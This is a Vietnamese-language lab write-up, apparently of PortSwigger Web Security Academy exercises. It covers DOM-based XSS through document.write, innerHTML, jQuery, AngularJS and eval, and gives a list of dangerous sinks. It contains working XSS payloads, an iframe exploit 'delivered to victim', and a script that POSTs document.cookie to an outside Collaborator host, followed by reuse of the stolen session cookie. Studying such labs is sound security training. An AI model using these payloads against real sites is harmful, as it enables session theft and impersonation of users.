Bài thực hành này có một lỗ hổng DOM-based XSS trong chức năng kiểm tra kho hàng. Ứng dụng sử dụng hàm JavaScript document.write để hiển thị dữ liệu ra trang. Hàm này nhận dữ liệu trực tiếp từ location.search, tức là người dùng có thể thay đổi nội dung thông qua tham số trên URL. Phần dữ liệu này sau đó được đưa vào trong thẻ select.
 Bước 1: Trên các trang sản phẩm, JavaScript  trích xuất một storeId từ location.search. 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ff21ca84-cc15-4365-b794-a33a94cdc1d0" />
Sau đó, nó được sử dụng document.write để tạo một tùy chọn mới trong phần tử select cho chức năng kiểm tra kho.chuỗi abcd1234 được liệt kê là một trong các tùy chọn trong danh sách thả xuống.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/44365c90-f37d-4cce-8f9f-b314541f0579" />
Bước 2:Thay đổi URL để bao gồm tải trọng XSS phù hợp bên trong storeIdtham số như sau:
  product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9a6cbe0e-ad52-4b93-8586-6f509653f40c" />
Vì dữ liệu từ storeId được chèn trực tiếp vào HTML bằng document.write(), nên nếu kẻ tấn công cung cấp một giá trị độc hại trong tham số storeId, trình duyệt sẽ phân tích và hiển thị nó như mã HTML hoặc JavaScript hợp lệ.
3.3.3 DOM XSS trong innerHTML sử dụng nguồn location.search
Lab này tồn tại lỗ hổng XSS (Cross-site Scripting) dựa trên DOM trong chức năng tìm kiếm của blog. Ứng dụng sử dụng gán innerHTML để hiển thị nội dung vào một thẻ div, lấy dữ liệu trực tiếp từ location.search.
Bước 1: Nhập tìm kiếm <img src=1 onerror=alert(1)> 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4bb2de13-b5e7-4727-8ebb-6e7cec2a92cb" />
Giá trị của src không hợp lệ và trả về lỗi. Điều này kích hoạt trình xử lý sự kiện onerror, sau đó gọi alert(). Kết quả là, payload được thực thi bất cứ khi nào trình duyệt của người dùng cố gắng tải trang chứa bài đăng độc hại.
3.3.4 DOM XSS trong jQuery với điểm đích là thuộc tính href sử dụng dữ liệu từ location.search 
Lab này có lỗ hổng XSS dựa trên DOM trong trang gửi phản hồi. Ứng dụng sử dụng hàm selector $ của jQuery để tìm thẻ liên kết (<a>) và gán giá trị cho thuộc tính href của thẻ này bằng dữ liệu lấy từ location.search. Bằng cách tạo một đoạn mã gây hiển thị cảnh báo (alert) chứa giá trị document.cookie thông qua liên kết "back".
Bước 1: Trên trang feedback thay đổi truy vấn returnPath thành /mytien1234
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6986487b-d48b-403f-9891-93e87395e155" />
Quan sát chuỗi mytien1234 đã được đặt bên trong href thuộc tính a.
Bước 2: Thay đổi returnPath thành javascript:alert(document.cookie) rồi nhấn back
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8816f985-c0b1-434a-9f94-3261a166d032" />
- Trên trang "feedback", tham số returnPath từ URL được đưa thẳng vào thuộc tính href của liên kết "back".
      + Nếu ta nhập chuỗi ngẫu nhiên, chuỗi đó sẽ xuất hiện nguyên văn trong href.
      + Nếu ta thay bằng javascript:alert(document.cookie), khi bấm vào liên kết, trình duyệt thực thi đoạn JavaScript này → hiện hộp thoại chứa cookie
3.3.5 DOM XSS trong jQuery, với điểm đích là hàm chọn phần tử (selector), khai thác thông qua hashchange.
Lab này có lỗ hổng XSS dựa trên DOM trên trang chủ. Ứng dụng sử dụng hàm selector $() của jQuery để tự động cuộn tới một bài viết cụ thể, trong đó tiêu đề bài viết được lấy trực tiếp từ thuộc tính location.hash. Bằng cách tạo payload khiến nạn nhân khi truy cập sẽ thực thi hàm print() trong trình duyệt.
Bước 1: Mở the exploit server, thêm vào phần Body 
iframe:
<iframe src="https://0a6c006603f56be78071e4ad001a0049.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/97271563-5080-4a16-b391-5d86893a473b" />
Bước 2:Nhấn Store the exploit ->View exploit  để xác nhận rằng print() được gọi-> Deliver to victim 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3fc01c97-f9b0-4599-a978-1c977b3406db" />
Payload hoạt động vì ứng dụng lấy hash từ URL và đưa thẳng vào jQuery selector, nên khi hash chứa mã độc được chèn qua iframe, nó dẫn đến thực thi JavaScript (DOM XSS).
3.3.6 DOM XSS trong biểu thức AngularJS, với dấu ngoặc nhọn và dấu ngoặc kép đã được mã hóa HTML
Lab này chứa lỗ hổng thực thi mã lệnh chéo trang dựa trên DOM trong biểu thức AngularJS trong chức năng tìm kiếm.
AngularJS là một thư viện JavaScript phổ biến, quét nội dung của các nút HTML chứa thuộc ng-apptính (còn được gọi là chỉ thị AngularJS). Khi một chỉ thị được thêm vào mã HTML, ta có thể thực thi các biểu thức JavaScript trong cặp dấu ngoặc nhọn. 
Bước 1: Nhập tìm kiếm chuỗi mytien1234.Quan sát thấy chuỗi đó được bao gồm trong một ng-app
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/05f62b54-cae1-4c1f-bee0-5906abdd8b2a" />
Bước 2: Nhập {{$on.constructor('alert(1)')()}} vào tìm kiếm
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/55b63e5f-ba82-4087-97da-9fb8b119b925" />
Do dữ liệu từ hộp tìm kiếm được chèn thẳng vào ng-app directive, attacker có thể đưa vào một biểu thức AngularJS tùy ý, khiến ứng dụng thực thi JavaScript độc hại.
3.3.7 Reflected DOM XSS
Bài thực hành này mô tả lỗ hổng Reflected DOM XSS, khi dữ liệu từ yêu cầu được phản hồi lại và script trên trang xử lý không an toàn, đưa vào một vùng nhớ nguy hiểm.
Bước 1: Tìm kiếm XSS trong tab Intercept chuỗi XSS trong phản hồi JSON có tên là search-results
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/30732b76-d648-449d-bdb5-dda6b366d7fa" />
Bước 2: Mở Site Map, để mở searchResults.js. Quan sát thấy phản hồi được sử dụng bằng lệnh gọi eval()
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2107aa7f-0af7-4d5c-a32c-d904445224c8" />
Bước 3: Nhập \"-alert(1)}// vào ô tìm kiếm:
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7bdd4580-c8a3-4c3d-b0d2-a87ebfb622c1" />
Payload thành công vì lợi dụng việc eval() xử lý JSON, kết hợp kỹ thuật thoát chuỗi bằng backslash chưa được lọc, cho phép chèn JavaScript trực tiếp.
3.3.8 Stored DOM XSS
Bước 1:  Đăng bình luận có chứa vector: <><img src=1 onerror=alert(1)>
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ddfb424f-e5a1-43b3-8b42-5d876f54eaee" />
Website dùng replace() để lọc < >, nhưng chỉ thay lần đầu.Trong payload cặp < > đầu bị lọc, nhưng <img ...> phía sau vẫn chèn vào DOM. Kết quả: ảnh lỗi → onerror=alert(1) chạy → popup hiện ra.
3.3.9 Những sink dẫn đến DOM XSS
- Nguyên nhân chính:
      + document.write()                       + element.outerHTML
      + element.insertAdjacentHTML             + document.writeln()
      + document.domain                        + element.innerHTML
      + element.onevent
- Các hàm jQuery:
      + add()                  + wrap()
      + after()                + wrapInner()
      + append()               + wrapAll()
      + animate()              + has()
      + insertAfter()          + constructor()
      + insertBefore()         + init()
      + before()               + index()
      + html()                 + jQuery.parseHTML()
      + prepend()              + $.parseHTML()
      + replaceAll()           ++ replaceWith()  
3.3.10 Cách ngăn chặn DOM XSS: Không cho phép dữ liệu từ bất kỳ nguồn không đáng tin cậy nào được ghi động vào tài liệu HTML.
4. Khai thác lỗ hổng cross-site scripting
4.1 Khai thác tấn công cross-site scripting để đánh cắp cookie
Lab này chứa một lỗ hổng XSS được lưu trữ trong chức năng bình luận của blog. Người dùng giả lập sẽ xem tất cả bình luận sau khi chúng được đăng. Để giải quyết bài thực hành, hãy khai thác lỗ hổng để đánh cắp cookie phiên của nạn nhân, sau đó sử dụng cookie này để mạo danh nạn nhân.
Bước 1: Chuyển đến tab the Collaborator, nhấn vào Copy to clipboard
Bước 2: Gửi nội dung sau vào blog:
<script>
fetch('https://1kmlk85vcr4wxtot3mjir0sxdojf7kv9.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
Tập lệnh này sẽ gửi yêu cầu POST chứa cookie của bất kỳ ai xem bình luận đến tên miền phụ của bạn trên máy chủ Collaborator công khai.
Bước 3: Quay lại Collaborator. Ghi lại giá trị cookie của nạn nhân trong nội dung POST.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7d32d32d-eccf-4c31-bfe4-576155ef7714" />
giá trị cookie: 3XsEYKip1OGABghv3wdMZRm1y0fT5a0H
Bước 4: Tải lại trang blog chính, sử dụng Burp Repeater để thay thế cookie phiên của ta bằng cookie ta đã ghi lại trong Burp Collaborator. 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13dda52b-e65f-4e72-9382-55d6d703bd34" />







